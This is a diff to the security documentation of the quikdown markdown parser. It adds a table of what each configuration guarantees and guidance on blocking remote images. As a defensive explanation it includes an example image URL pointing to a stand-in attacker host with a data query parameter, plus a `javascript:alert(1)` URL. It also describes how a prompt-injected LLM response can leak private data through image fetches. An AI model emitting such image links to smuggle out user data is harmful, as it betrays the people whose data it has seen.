@@ -4,6 +4,23 @@
 
 quikdown is designed with security as a primary concern. This document explains our security model, design choices, and best practices for safe usage.
 
+## Security Contract
+
+What the parser guarantees, by configuration. "Safe to insert" means the returned string can be assigned to `innerHTML` (or React's `dangerouslySetInnerHTML`) without creating script execution from the markdown input.
+
+| Configuration | Raw HTML in markdown | URLs in links and images | Images | Safe to insert untrusted markdown? |
+|---|---|---|---|---|
+| **Defaults** | Escaped | `javascript:`, `vbscript:` and non-image `data:` become `#` | `<img>` emitted; the browser fetches `src` | **Yes** for script execution. Remote images can still be loaded — see [Remote images](#remote-images-allow_images). |
+| `allow_images: false` | Escaped | Same as defaults | Rendered as links; nothing is fetched | **Yes**, and no implicit network requests. Recommended for LLM / agent output. |
+| `allow_unsafe_urls: true` | Escaped | Not checked | `<img>` emitted | **No** — `javascript:` links execute on click. Trusted input only. |
+| `allow_unsafe_html: [tags]` | Listed tags pass through with `on*` attributes stripped and URL attributes sanitized; all others escaped | Same as defaults | Same as defaults | Depends on the tags you list. |
+| `allow_unsafe_html: true` | Passed through unchanged | Same as defaults | Same as defaults | **No.** Trusted input only. |
+| `fence_plugin` set | Escaped outside fences; **the plugin's return value is inserted as-is** | Same as defaults | Same as defaults | Only if the plugin escapes or sanitizes what it returns. |
+
+The same rules apply to `quikdown_bd` (it calls the same parser). The editor (`quikdown/edit`) adds its own trust boundaries, described under [Editor Security Considerations](#editor-security-considerations).
+
+These behaviours are covered by `tests/quikdown_security.test.js` and `tests/quikdown_downstream_contract.test.js`; changing them is treated as a breaking change.
+
 ## Core Security Principles
 
 ### 1. Escape by Default
@@ -120,6 +137,20 @@ quikdown includes built-in URL sanitization via `sanitizeUrl()`. All URLs in lin
 - `javascript:` URLs are replaced with `#`
 - `vbscript:` URLs are replaced with `#`
 - `data:` URLs are replaced with `#` (except `data:image/*`, which is allowed)
+
+URLs that contain balanced parentheses, such as `https://en.wikipedia.org/wiki/Foo_(bar)` or `javascript:alert(1)`, are read whole before being checked (v1.2.23+).
+
+### Remote images (`allow_images`)
+
+Escaping and URL sanitization stop script execution, but a markdown image is still an instruction to the browser: `![](https://attacker.example/p.png?d=...)` is fetched the moment the HTML is inserted. When the markdown comes from an LLM or agent that has seen private data, a prompt-injected response can use that request to send the data out, and any remote image lets its host see who viewed the content.
+
+Set `allow_images: false` to close this channel. Images are rendered as ordinary links, so nothing is requested unless the reader clicks:
+
+```javascript
+quikdown(agentOutput, { allow_images: false });
+```
+
+Alternatively, keep images and restrict where they can load from with a Content Security Policy (`img-src 'self' data:`).
 
 ## Fence Plugin Security
 
@@ -249,6 +280,7 @@ Before deploying quikdown:
 - [ ] **Audit fence plugins** - Review all custom plugin code
 - [ ] **Test with malicious input** - Try XSS payloads in testing
 - [ ] **Use HTTPS** - Prevent MITM attacks on delivered content
+- [ ] **Decide on remote images** - set `allow_images: false` (or a CSP `img-src`) when rendering LLM output or other untrusted markdown
 - [ ] **Review URL sanitization** settings (built-in `sanitizeUrl()` blocks `javascript:`, `vbscript:`, and non-image `data:` URIs by default)
 
 ## Reporting Security Issues
